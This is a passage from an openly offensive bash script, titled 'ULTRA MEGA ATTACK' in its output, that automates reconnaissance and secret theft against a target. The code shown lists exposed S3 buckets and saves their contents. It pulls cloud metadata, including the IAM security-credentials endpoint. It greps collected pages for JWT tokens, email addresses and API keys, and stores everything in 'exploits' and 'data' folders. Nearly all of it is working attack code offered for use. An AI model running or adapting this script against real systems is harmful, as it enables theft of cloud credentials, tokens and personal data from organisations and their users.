    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "https://$bucket.s3.amazonaws.com/" 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "403" ]; then
        log_result "s3" "[+] $bucket ($r)"
        curl -k -s "https://$bucket.s3.amazonaws.com/?list-type=2" > "$OUTPUT_DIR/exploits/s3_${bucket}_list.xml" 2>/dev/null
    fi
done
echo ""

# ============================================
# CLOUD METADATA
# ============================================
echo -e "${YELLOW}[7] Cloud Metadata${NC}"
for path in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://metadata.google.internal/computeMetadata/v1/" "http://169.254.169.254/metadata/instance"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "$path" 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "401" ]; then
        curl -k -s --connect-timeout $TIMEOUT "$path" > "$OUTPUT_DIR/exploits/cloud_$(echo $path | tr '/' '_' | cut -c1-30).html" 2>/dev/null
        log_result "cloud_metadata" "[+] $path ($r)"
    fi
done
echo ""

# ============================================
# JWT TOKENS
# ============================================
echo -e "${YELLOW}[8] JWT Tokens${NC}"
grep -roE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR" 2>/dev/null | head -20 > "$OUTPUT_DIR/data/jwt_tokens.txt"
[ -s "$OUTPUT_DIR/data/jwt_tokens.txt" ] && log_result "jwt" "[+] $(cat "$OUTPUT_DIR/data/jwt_tokens.txt" | wc -l) JWT tokens found" || log_result "jwt" "[-] No JWT tokens found"
echo ""

# ============================================
# EMAIL / API KEYS
# ============================================
echo -e "${YELLOW}[9] Emails & API Keys${NC}"
grep -roE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" "$OUTPUT_DIR" 2>/dev/null | sort -u > "$OUTPUT_DIR/data/emails.txt"
grep -roE "(sk-[a-zA-Z0-9]{32,}|pk_[a-zA-Z0-9]{32,}|[a-f0-9]{32,})" "$OUTPUT_DIR" 2>/dev/null | sort -u > "$OUTPUT_DIR/data/api_keys.txt"
log_result "emails" "[+] $(cat "$OUTPUT_DIR/data/emails.txt" 2>/dev/null | wc -l) emails found"
log_result "api_keys" "[+] $(cat "$OUTPUT_DIR/data/api_keys.txt" 2>/dev/null | wc -l) API keys found"
echo ""

# ============================================
# FINAL REPORT
# ============================================
echo -e "${RED}=====================================${NC}"
echo -e "${GREEN}ULTRA MEGA ATTACK - DÜZELTİLDİ!${NC}"
echo -e "${RED}=====================================${NC}"
echo ""
echo -e "${YELLOW}RESULTS:${NC}"
echo -e "${CYAN}Subdomains found: $FOUND_SUBS${NC}"
echo -e "${CYAN}Pages: $(ls -1 "$OUTPUT_DIR/pages/" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Exploits: $(ls -1 "$OUTPUT_DIR/exploits/" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Logs: $(ls -1 "$OUTPUT_DIR/logs/" 2>/dev/null | wc -l)${NC}"
echo ""
echo -e "${YELLOW}CRITICAL FINDINGS:${NC}"
for logfile in "$OUTPUT_DIR/logs"/*.txt; do
    if [ -f "$logfile" ] && [ -s "$logfile" ]; then
        echo -e "${RED}[!] $(basename "$logfile" .txt)${NC}"
        cat "$logfile" | head -3
        echo ""
    fi
done
echo ""
echo -e "${RED}=====================================${NC}"
echo -e "${GREEN}All results saved to: $OUTPUT_DIR/${NC}"
echo -e "${RED}=====================================${NC}"
